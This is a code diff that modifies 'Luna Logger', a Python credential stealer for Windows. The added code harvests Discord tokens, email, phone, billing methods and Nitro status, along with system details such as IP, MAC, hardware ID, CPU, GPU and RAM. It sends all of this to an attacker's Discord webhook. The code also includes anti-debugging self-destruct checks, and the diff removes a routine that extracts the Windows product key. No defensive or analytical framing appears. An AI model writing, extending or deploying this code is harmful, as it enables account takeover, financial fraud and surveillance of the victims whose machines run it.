@@ -3,30 +3,34 @@ from base64 import b64decode
 from json import dump, load, loads
 from re import findall
 from subprocess import PIPE, Popen
-from time import localtime, strftime
 from urllib.request import urlopen
-from winreg import HKEY_LOCAL_MACHINE, OpenKey, QueryValueEx
 import psutil
+import wmi
+import re
+import requests
+import platform
+import uuid
 from Crypto.Cipher import AES
-from cryptography.fernet import Fernet
 from discord import Embed, RequestsWebhookAdapter, Webhook
-from httpx import get as httpget
 from requests import get
 from win32crypt import CryptUnprotectData
-webhook = "&webhook_here&"
+
+webhook = "%webhook_here%"
+
 def main(webhook):
     global embed
     
     webhook = Webhook.from_url(webhook, adapter=RequestsWebhookAdapter())
     embed = Embed(title="Luna Logger", color=5639644)
     
+    get_inf()
     grabtokens()
     
-    embed.set_author(name=f"{strftime('%D | %H:%M:%S', localtime())}")
-    embed.set_footer(text="Luna | Created with ♥ by Luna's Dev Team")
+    embed.set_footer(text="Luna | Created with ♥ by Smug")
     embed.set_thumbnail(url="https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096")
     
-    webhook.send(embed=embed, avatar_url="https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096")
+    webhook.send(content="@everyone", embed=embed, avatar_url="https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096")
+
 def Luna():
     for function in [debug(),
                      main(webhook),]:
@@ -34,7 +38,25 @@ def Luna():
             function()
         except:
             pass
+
+def get_inf():
+	ip_address = requests.get('http://ipinfo.io/json').json()['ip']
+	mac_address = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
+
+	p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
+	hwid = (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]
+
+	cwd = os.getcwd()
+	pc_username = os.getenv("UserName")
+	pc_name = os.getenv("COMPUTERNAME")
+	computer_os = platform.platform()
+	
+	cpu = wmi.WMI().Win32_Processor()[0]
+	gpu = wmi.WMI().Win32_VideoController()[0]
+	ram = round(float(wmi.WMI().Win32_OperatingSystem()[0].TotalVisibleMemorySize) / 1048576, 0)
   
+	embed.add_field(name="SYSTEM INFO", value=f"```PC Username: {pc_username}\nPC Name: {pc_name}\nOS: {computer_os}\n\nIP: {ip_address}\nMAC: {mac_address}\nHWID: {hwid}CPU: {cpu.Name}\nGPU: {gpu.Name}\nRAM: {ram}GB```", inline=False)
+
 class grabtokens():
     def __init__(self):
         self.baseurl = "https://discord.com/api/v9/users/@me"
@@ -111,36 +133,6 @@ class grabtokens():
             return decrypted_pass
         except Exception:
             return "Failed to decrypt password"
-    
-    def getProductKey(self, path: str = r'SOFTWARE\Microsoft\Windows NT\CurrentVersion'):
-        def strToInt(x):
-            if isinstance(x, str):
-                return ord(x)
-            return x
-        chars = 'BCDFGHJKMPQRTVWXY2346789'
-        wkey = ''
-        offset = 52
-        regkey = OpenKey(HKEY_LOCAL_MACHINE,path)
-        val, _ = QueryValueEx(regkey, 'DigitalProductId')
-        productName, _ = QueryValueEx(regkey, "ProductName")
-        key = list(val)
-        for i in range(24,-1, -1):
-            temp = 0
-            for j in range(14,-1,-1):
-                temp *= 256
-                try:
-                    temp += strToInt(key[j+ offset])
-                except IndexError:
-                    return [productName, ""]
-                if temp / 24 <= 255:
-                    key[j+ offset] = temp/24
-                else:
-                    key[j+ offset] = 255
-                temp = int(temp % 24)
-            wkey = chars[temp] + wkey
-        for i in range(5,len(wkey),6):
-            wkey = wkey[:i] + '-' + wkey[i:]
-        return [productName, wkey]
         
     def grabTokens(self):
         global token, tokens
@@ -215,35 +207,41 @@ class grabtokens():
                                     self.tokens.append(token)
         
         for token in self.tokens:
-            r = get(
+            r = requests.get(
                 'https://discord.com/api/v9/users/@me',
                 headers={"Authorization": token})
- 
+            
             username = r.json()['username'] + '#' + r.json()['discriminator']
+            uid = r.json()['id']
             phone = r.json()['phone']
             email = r.json()['email']
-            mfa_enabled = r.json()['mfa_enabled']
-            billing = bool(len(loads(httpget(
-                "https://discord.com/api/v9/users/@me/billing/payment-sources", headers=self.getheaders(token)).text)) > 0)
-            ip = load(urlopen('https://jsonip.com/'))['ip']
-            hwid = (Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE).stdout.read()
-                    + Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE).stderr.read()).decode().split("\n")[1]
+
+            try:
+                if r.json()['premium_type'] == 1:
+                    nitro = 'Nitro Classic'
+                elif r.json()['premium_type'] == 2:
+                    nitro = 'Nitro Boost'
+            except:
+                nitro = 'None'
+
+            b = requests.get("https://discord.com/api/v6/users/@me/billing/payment-sources",
+                             headers=self.getheaders(token))
+
+            if b.json() == []:
+                methods = "None"
+            else:
+                methods = ""
+                for method in b.json():
+                    if method['type'] == 1:
+                        methods += "💳"
+                    elif method['type'] == 0:
+                        methods += "<:paypal:973417655627288666>"
+                    else:
+                        methods += "❓"
+
+            embed.add_field(name="DISCORD INFO", value=f"```Discord Username: {username} \nDiscord ID: {uid}\nEmail: {email}\n\nPhone: {phone}\nNitro: {nitro}\nBilling: {methods}\n\nToken:{token}```", inline=False)
             
-            embed.add_field(name=f'User: `{username}`', value=f"Token: `{token}`", inline=False)
-            
-            embed.add_field(name=f'Phone:', value=f"`{phone}`", inline=True)
-            embed.add_field(name=f'Email:', value=f"`{email}`", inline=True)
-            embed.add_field(name=f'MFA:', value=f"`{mfa_enabled}`", inline=True)
-            embed.add_field(name=f'Billing:', value=f"`{billing}`", inline=True)
-            embed.add_field(name=f'IP:', value=f"`{ip}`", inline=True)
-            embed.add_field(name=f'HWID:', value=f"`{hwid}`", inline=True)
-            
-            embed.add_field(name='\u200b', value="\u200b", inline=False)
-            
-    
-    def get_token_data(self):
-        pass
-        
+
 class debug:
     def __init__(self):
         if self.checks(): self.self_destruct()
@@ -270,6 +268,7 @@ class debug:
         for process in self.blacklistedProcesses:
             if process in (p.name() for p in psutil.process_iter()):
                 self.self_destruct()
+
     def get_ip(self):
         url = 'https://jsonip.com/'
         response = urlopen(url)
